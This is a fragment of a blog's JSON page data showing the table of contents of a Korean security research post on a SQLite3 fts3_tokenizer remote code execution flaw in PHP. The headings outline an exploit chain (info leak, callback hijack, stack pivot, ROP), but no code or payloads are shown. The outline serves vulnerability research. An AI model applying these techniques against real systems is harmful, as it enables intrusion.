href=\"https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf\">us 17 Feng Many Birds One Stone Exploiting A Single SQLite Vulnerability Across Multiple Software</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-sandbox\">PHP Sandbox</a></p>\n<ul>\n<li><a href=\"#php-debugging\">PHP Debugging</a></li>\n<li><a href=\"#safe-mode-bypass\">Safe Mode Bypass</a></li>\n<li><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\">PHP SQLite 모듈 (PHP 5.3≥)</a></li>\n<li><a href=\"#fts3_tokenizer-overview\">fts3_tokenizer Overview</a></li>\n<li><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\">SQLite fts3 기능을 활용한 검색 방안</a></li>\n<li><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\">사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\">SQLite fts3 취약점</a></p>\n<ul>\n<li><a href=\"#fts3-module-base-address-leaked\">fts3 module base address leaked</a></li>\n<li><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\">SQLite fts3_tokenizer(), fts3_tokenizer()</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\">fts3 callback을 통한 임의의 코드 실행 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\">xOpen 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\">Exploit 공격 흐름도</a></p>\n</li>\n<li>\n<p><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\">x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</a></p>\n<ul>\n<li><a href=\"#fts3_tokenizer-info-leak\">fts3_tokenizer info leak</a></li>\n<li><a href=\"#fts3-tokenizer-callback\">fts3 tokenizer callback</a></li>\n<li><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\">fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</a></li>\n<li><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\">Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</a></li>\n<li><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\">ROP 기법을 활용하여 RCE 취약점 수행</a></li>\n<li><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\">ROP를 활용해서 시스템 라이브러리 함수 호출 진행</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 20, 2020","title":"SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥙"},"fields":{"slug":"/php-sqlite3-1day-rce/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cve_2012_0002_1-day/","nextSlug":"/d3ctf2019_new_heap_ctf_writeup/","prevSlug":"/php-sqlite3-1day-rce/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}